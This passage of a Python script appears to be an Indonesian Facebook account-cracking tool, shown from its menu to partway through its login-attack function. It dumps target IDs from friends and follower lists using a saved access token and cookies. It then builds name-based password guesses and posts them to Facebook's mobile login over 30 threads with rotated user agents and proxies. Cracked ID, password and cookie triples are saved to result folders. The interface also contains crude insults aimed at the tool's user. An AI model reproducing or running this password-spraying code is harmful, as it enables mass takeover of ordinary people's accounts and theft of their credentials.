	table.add_row("01","CRACK PUBLIK","OFF")
	table.add_row("02","CRACK MASSAL","ONLINE")
	table.add_row("03","CRACK FILE","ONLINE")
	table.add_row("04","CLONE EMAIL","UPDATE")
	table.add_row("05","CEK OPSI","ONLINE")
	table.add_row("06","CEK RESULT","ONLINE")
	table.add_row("00", "KELUAR", " ONLINE") 
	Consol=Console()
	cetak(nel(table,width=79,title=f"[bold green]MENU",style="bold hot_pink2"))

	RAF_MKZ=wa.input(f"  [bold red] ╰─ [bold white]PILIH : [bold green]") 
	if RAF_MKZ in ['1','01']:
		raf_dump()
	elif RAF_MKZ in ['2','02']:
		dump_massal()
	elif RAF_MKZ in ['3','03']:
		crack_file()
	elif RAF_MKZ in ['4','04']:
		clon_email()
	elif RAF_MKZ in ['5','05']:
		file_cp()
	elif RAF_MKZ in ['6','06']:
		result()
	elif RAF_MKZ in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{m}Sukses Logout+Hapus Cookies{x}')
		exit()
	else:
		print(' ╰─  Pilih Yang Bener Asu ')
		back()
def error():
	print(f' ╰─  Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
#-----------------[ CRACK NAMA ]-----------------#
def lainnya():
	cetak(nel(f"[bold green]1[bold white]. [bold green]CRACK USERNAME\n[bold green]2[bold white]. [bold yellow]EXIT", width=79, title=f"[bold green]CRACK NO LOGIN", style="bold hot_pink2")) 
	RAF_MKZ=wa.input(f"  [bold grey] ╰─ PILIH : [bold green]") 
	if RAF_MKZ in ['1','01']:
		crack_nama()
	elif RAF_MKZ in ['2','02']:
		pengikut()
	else:
		print ('PILIH YANG BENER BANG')
		time.sleep(5)
		back()
		
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' ╰─  Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" ╰─  Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()
		
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' [+] Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [+] Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()


def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(panel(f"[bold white]Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=79,padding=(0,2),style=f"bold hot_pink2"))
	nam = wa.input(f' ╰─  Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
	
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f' [{hh}>{P}] Dump Dari Email, Max 1000 Id')
	nama = input(' target : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] Masukan 1 Nama Saja')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] Masukan Domain Yang Benar')
	jumlah = input(' total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==2000:atur_atur()
		print('\r Sedang Dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	setting()	
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=100,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"{domris}"))
	kz = input(f'\n {P}[{x}{H}?{x}{P}]{x} {P}select{x} : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} ╰─  {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n ╰─  Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' ╰─  Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def raf_dump():
	try:
		cok = open('.cok.txt','r').read()
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	pil = input(f'{P} ╰─  {P}Masukan ID target : \x1b[1;92m ')
	try:
		koH = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token=',tokenku[0],cookies = {'cookies':cok}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		print(f'{M} ╰─  {P}Total ID yang Terkumpul : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(' ╰─  Internet Lu Gak Ada Anjing')
		exit()
	except (KeyError,IOError):
		print(' ╰─  Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{m}╰─ {P}Mau Berapa Idz Target  :  \x1b[1;92m')) 
	except ValueError:
		print(' ╰─  Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f' [{h}*{x}] Friendship Not Public  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{m}╰─ {P}Masukan Idz Target Yang Ke ' +str(yz)+ ' : \x1b[1;92' )
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v15.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' ╰─  Unstable Signal ')
			exit()
	try:
		cetak(nel(f'[bold white]Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)),width=79, title=f'[bold green]TOTAL ID', style='bold hot_pink2')) 
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' ╰─  Unstable Signal ')
		back()
	except (KeyError,IOError):
		print(f' ╰─  {k} Friendship Not Public {x}')
		time.sleep(3)
		back()
		
def crack_file():
	try:vin = os.listdir('/sdcard/ALVINO-DUMP')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ALVINO-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{h}[{P}>{h}] {x} %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	akunok=[]
	cepeh=[]
	table=Table()
	table.add_column("NO", justify="center", width=11, style="green") 
	table.add_column("MENU", justify="center", width=36, style="green") 
	table.add_column("STATUS", justify="center", width=20, style="green")
	table.add_row("01", "CRACK ID OLD", " NOT RECOMENDED") 
	table.add_row("02","CRACK ID NEW","RECOMENDED")
	table.add_row("03","CRACK ID RANDOM","VERY RECOMENDED")
	cetak(nel(table, width=79, title=f"[bold green]URUTAN ID",style="bold hot_pink2"))
	hu = Console().input(f'[bold red] ╰─ [bold white]Pilih urutan id : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' ╰─  Pilih Yang Bener Kontooll ')
		exit()
	table=Table()
	table.add_column("NO",justify="center",width=11,style="green")
	table.add_column("MENU CRACK ",justify="center",width=36,style="green")
	table.add_column("STATUS",justify="center",width=20,style="green")
	table.add_row("01","asycn m.fb","VERY RECOMENDED")
	table.add_row("02","asycn mbasic","recomended")
	table.add_row("03","reguler m.fb","recomended")
	table.add_row("04","validate m.fb","recomended")
	table.add_row("05","iphone.facebook","recomended")
	cetak(nel(table,width=79,title=f"[bold green]METODE LOGIN",style="bold hot_pink2"))
	hc = input(f'{M} ╰─  {P}Pilih metode : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('free')
	elif hc in ['4','04']:
		method.append('mobilev2')
	elif hc in ['5','05']:
		method.append('lawakv1')
	elif hc in ['6','06']:
	    method.append('lawakv2')
	else:
		method.append('mobile')
	#print('')
	##cp = input('\r╰─  Tampilkan sesi CP!? ya/no: \x1b[1;93m ')
	#if cp in ['']:
		#print('{M} ╰─  Pilih Yang Bener ')
		#back()
	#elif cp in ['y','Y']:
		#cepeh.append('ya')
	#else:
		#cepeh.append('no')
	#print('----------------------------') 
	##apk =input(f'\r╰─  {P}tampilkan Aplikasi!?Y/T : \x1b[1;93m ')
	#if apk in ['y','Y']:
		#akunok.append('apk')
	#else:akunok.append('coki') 
#		pwku=input(f'\r╰─  {P}Masukkan Sandi : ')
#		pwkuh=pwku.split(',')
#		for xpw in pwkuh:
#			pwnya.append(xpw)
#	else:
#		pwpluss.append('no')
		
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=79,title=f"[bold green]Setting User-Agent",style="bold hot_pink2")) 
	uatambah = input(f'\r╰─  {P}TAMBAHKAN USER AGENT(UA) Y/N : \x1b[1;93m ')
	if uatambah in ['y','Ya','ya','Y']:
		uman.append('y')
		bzer = input(f' ╰─  Masukan User-Agent : \x1b[1;93m ')
		usman1.append(bzer)
	else:
		uman.append('tidak')
	passwrd()
	
	
from datetime import datetime    	
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	#print(f'{asu} FILE RESULT TERSIMPAN DI ↓')
	sayang=[]
	sayang.append(panel(f'[bold green]%s [bold white]'%(okc), width=39, title=f"[bold green]OK SAVE IN", style="bold hot_pink2")) 
	sayang.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=39,title=f"[bold yellow]CP SAVE IN",style="bold hot_pink2"))
	wa.print(Columns(sayang))
	print(f'\n\t\t\t{P}ON/OF MODE PESAWAT SETIAP {M}200 {P}IDZ')
	awal = datetime.now()
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:

						pwv.append(nmf)

						pwv.append(frs+'01')

						pwv.append(frs+'02')

						pwv.append(frs+'03')

						pwv.append(frs+'04')

						pwv.append(frs+'05')

						pwv.append(frs+'06')

						pwv.append(frs+'07')

						pwv.append(frs+'08')

						pwv.append(frs+'09')

						pwv.append(frs+'12')

						pwv.append(frs+'123')

						pwv.append(frs+'321')
						
						pwv.append(frs+'4321')
						
						pwv.append(frs+'54321')

						pwv.append(frs+'1234')

						pwv.append(frs+'12345')

						pwv.append(frs+'123456')

						pwv.append(frs+'sayang')

						pwv.append(frs+'cantik')

				else:

					if len(frs)<3:

						pwv.append(nmf)

					else:

						pwv.append(nmf)

						pwv.append(frs+'01')

						pwv.append(frs+'02')

						pwv.append(frs+'03')

						pwv.append(frs+'04')

						pwv.append(frs+'05')

						pwv.append(frs+'06')

						pwv.append(frs+'07')

						pwv.append(frs+'08')

						pwv.append(frs+'09')

						pwv.append(frs+'12')

						pwv.append(frs+'123')

						pwv.append(frs+'321')
						
						pwv.append(frs+'4321')
						
						pwv.append(frs+'54321')

						pwv.append(frs+'1234')

						pwv.append(frs+'12345')

						pwv.append(frs+'123456')

						pwv.append(frs+'sayang')
					
						pwv.append(frs+'cantik')
						
						pwv.append('memek')
						
						pwv.append('sayang')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,awal)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mobilev2' in method:
					pool.submit(crackmobilev2,idf,pwv)
				elif 'lawakv1' in method:
					pool.submit(cracklawakv1,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crack1,idf,pwv,awal)
				elif 'lawakv2' in method:
					pool.submit(cracklawakv2,idf,pwv)
				else:
					pool.submit(crackmbasic,idf,pwv)
		print('')
	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
	
def useragent():
	sambro = str(random.randint(1,100))+'.'+str(random.randint(0,9))
	android_version = str(random.randint(1,12))
	device_model = random.choice(['RMO-NX1','SHARK PAR-H0','SAMSUNG SM-G736U1','SAMSUNG SM-G736U1','Infinix X655F','Nokia 8 V 5G UW','T790Y','T810S','RMX2202','CPH1983','SAMSUNG SM-G935L Build/NRD90M','SAMSUNG SM-E5260','SAMSUNG SM-A826S','Lenovo L19041','CPH2401','SAMSUNG SM-M336K/KSU3AVI3','BV8800','SAMSUNG SM-M017F','Z6252CA','SC-51B','V2044','SAMSUNG SM-J700P','KAZ-N20','BV9800','BV6600E'])
	chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
	ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36'
	return ua
#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv,awal):
	rescp=[]
	resok=[]
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"[bold white][[bold yellow]{ahir}[bold white]]-[[bold white]{loop}[bold yellow]/[bold white]{len(id)}[bold white]]-[[bold green]OK-:[bold green]{ok}[/] {k}CP-:[bold yellow]{cp}[bold white]][/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold red]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
